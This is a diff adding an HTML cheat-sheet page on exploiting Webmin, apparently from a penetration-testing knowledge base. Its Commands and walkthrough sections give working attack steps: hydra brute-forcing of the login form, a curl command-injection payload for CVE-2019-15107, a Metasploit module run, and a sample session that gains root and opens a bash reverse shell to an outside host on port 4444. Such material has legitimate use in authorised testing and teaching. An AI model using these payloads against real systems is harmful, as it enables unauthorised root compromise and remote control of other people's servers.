@@ -1,0 +1,167 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Webmin Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Web Administration</strong> • Focus: <strong>Webmin Abuse & Remote Code Execution</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Webmin (TCP/10000) is a web-based system administration tool for Unix/Linux. 
+    While powerful, it has been plagued with vulnerabilities, including remote 
+    code execution (RCE) in versions 1.890–1.920 and even supply-chain backdoors. 
+    Attackers exploit Webmin through brute force, weak SSL configurations, 
+    unauthenticated access, and known CVEs. Once compromised, Webmin gives attackers 
+    full administrative control of the host system.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Weak Authentication:</strong> Admin logins often use default or guessable creds.</li>
+    <li><strong>Unencrypted Access:</strong> Some instances run without SSL, exposing passwords in plaintext.</li>
+    <li><strong>RCE Vulnerabilities:</strong> Versions 1.890–1.920 (CVE-2019-15107) allowed unauthenticated RCE.</li>
+    <li><strong>Privilege Escalation:</strong> Many modules execute commands as root.</li>
+    <li><strong>Supply-Chain Risks:</strong> Backdoored Webmin packages were distributed in the wild.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify Webmin service on TCP/10000.</li>
+    <li><strong>Authentication:</strong> Attempt brute force or check for no-auth misconfigs.</li>
+    <li><strong>Vulnerability Exploitation:</strong> Leverage known CVEs (e.g., CVE-2019-15107).</li>
+    <li><strong>Post-Exploitation:</strong> Execute system commands, add users, or pivot internally.</li>
+    <li><strong>Impact:</strong> Full system compromise with root privileges.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for Webmin on TCP/10000.</li>
+    <li>Identify version via banner or HTML source.</li>
+    <li>Attempt login with default creds or brute force.</li>
+    <li>Exploit known RCE vulnerabilities (CVE-2019-15107, CVE-2022-0824, etc.).</li>
+    <li>Gain shell access and escalate privileges.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p10000 -sV [target]
+
+# ------------------------------
+# Brute Force Authentication
+# ------------------------------
+hydra -L users.txt -P rockyou.txt [target] http-post-form "/session_login.cgi:user=^USER^&pass=^PASS^:Failed"
+
+# ------------------------------
+# Exploit CVE-2019-15107 (Unauthenticated RCE)
+# ------------------------------
+curl -k -X POST https://[target]:10000/password_change.cgi \
+-d "user=root&pam=&expired=2&old=test|id"
+
+# ------------------------------
+# Exploit CVE-2022-0824 (Auth Bypass)
+# ------------------------------
+msfconsole
+use exploit/linux/http/webmin_packageup_rce
+set RHOSTS [target]
+set RPORT 10000
+set USERNAME admin
+set PASSWORD admin123
+run
+
+# ------------------------------
+# Connect with Browser / CLI
+# ------------------------------
+https://[target]:10000
+    </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p10000 -sV 192.168.1.110
+PORT      STATE SERVICE VERSION
+10000/tcp open  http    Webmin httpd 1.900
+
+[ saide ~ ]$ curl -k -X POST https://192.168.1.110:10000/password_change.cgi \
+-d "user=root&pam=&expired=2&old=test|id"
+uid=0(root) gid=0(root) groups=0(root)
+
+[+] Unauthenticated RCE achieved (CVE-2019-15107)
+
+[ saide ~ ]$ curl -k -X POST https://192.168.1.110:10000/password_change.cgi \
+-d "user=root&pam=&expired=2&old=test|bash -i >& /dev/tcp/192.168.1.200/4444 0>&1"
+
+[+] Reverse shell established on target
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample Webmin exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+10000/tcp open  Webmin httpd 1.900
+
+# Vulnerability
+CVE-2019-15107 → Unauthenticated RCE
+
+# Exploitation
+Command injection via password_change.cgi
+
+# Proof of Exploitation
+id → uid=0(root) gid=0(root) groups=0(root)
+Reverse shell → SYSTEM compromise
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/10000-pentesting-webmin" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting Webmin
+      </a>
+    </li>
+    <li>
+      <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-8877/product_id-15231/Webmin-Webmin.html" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        CVE Details – Webmin
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Fingerprint version → Exploit CVE → Root RCE → Pivot into environment.</li>
+  </ul>
+</section>
